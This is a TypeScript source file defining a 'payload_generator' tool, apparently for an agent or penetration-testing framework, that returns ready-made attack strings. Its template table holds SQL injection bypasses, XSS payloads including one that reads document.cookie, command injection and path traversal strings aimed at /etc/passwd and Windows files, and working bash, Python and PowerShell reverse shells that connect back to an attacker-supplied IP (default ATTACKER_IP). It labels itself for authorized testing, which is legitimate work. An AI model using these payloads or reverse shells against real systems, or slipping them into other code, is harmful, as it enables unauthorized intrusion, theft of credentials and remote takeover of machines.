import { BaseTool, ToolResult } from '../core/base-tool';

const PAYLOAD_TEMPLATES: Record<string, Record<string, string[]>> = {
  sqli: {
    auth_bypass: ["' OR '1'='1'--", "' OR 1=1#", "admin'--", '" OR ""="'],
    union_based: [
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT 1,user(),database()--",
    ],
    time_based: ["' AND SLEEP(5)--", "' AND pg_sleep(5)--"],
  },
  xss: {
    basic: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      '<svg/onload=alert(1)>',
    ],
    filter_bypass: [
      "<ScRiPt>alert('XSS')</ScRiPt>",
      'javascript:alert(document.domain)',
      '\"><img src=x onerror=alert(document.cookie)>',
    ],
  },
  cmd_inject: {
    linux: ['; id', '| id', '$(id)', '`id`', '; cat /etc/passwd'],
    windows: ['& dir', '| dir', '& whoami', '& type C:\\Windows\\win.ini'],
    blind: ['; sleep 5', '& ping -n 5 127.0.0.1'],
  },
  reverse_shell: {
    bash: ['bash -i >& /dev/tcp/{ip}/{port} 0>&1'],
    python: [
      "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    ],
    powershell: [
      "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"",
    ],
  },
  path_traversal: {
    linux: ['../../../etc/passwd', '..%2F..%2F..%2Fetc%2Fpasswd', '/etc/passwd%00'],
    windows: ['..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', '..%5c..%5c..%5cwindows%5cwin.ini'],
  },
};

export class PayloadGeneratorTool extends BaseTool {
  constructor() {
    super('payload_generator', 'Generate payload text templates for authorized security testing.');
  }

  async run(params: Record<string, unknown>): Promise<ToolResult> {
    const type = ((params.type as string | undefined) ?? '').trim().toLowerCase();
    const subType = ((params.sub_type as string | undefined) ?? '').trim().toLowerCase();
    const platform = ((params.platform as string | undefined) ?? '').trim().toLowerCase();
    const ip = ((params.ip as string | undefined) ?? 'ATTACKER_IP').trim();
    const port = String(params.port ?? '4444');

    if (!type) {
      return { success: false, result: null, error: `Missing parameter: type (${Object.keys(PAYLOAD_TEMPLATES).join(', ')})` };
    }
    const bucket = PAYLOAD_TEMPLATES[type];
    if (!bucket) {
      return { success: false, result: null, error: `Unsupported type: ${type}` };
    }

    const selected =
      (subType && bucket[subType] && { [subType]: bucket[subType] }) ||
      (platform && bucket[platform] && { [platform]: bucket[platform] }) ||
      bucket;

    const payloads: Record<string, string[]> = {};
    for (const [key, list] of Object.entries(selected)) {
      payloads[key] = list.map((v) => v.replaceAll('{ip}', ip).replaceAll('{port}', port));
    }

    const total = Object.values(payloads).reduce((sum, arr) => sum + arr.length, 0);
    return {
      success: true,
      result: {
        type,
        total_payloads: total,
        payloads,
        note: 'For authorized testing only. Generated payload text is not executed by this tool.',
      },
    };
  }
}

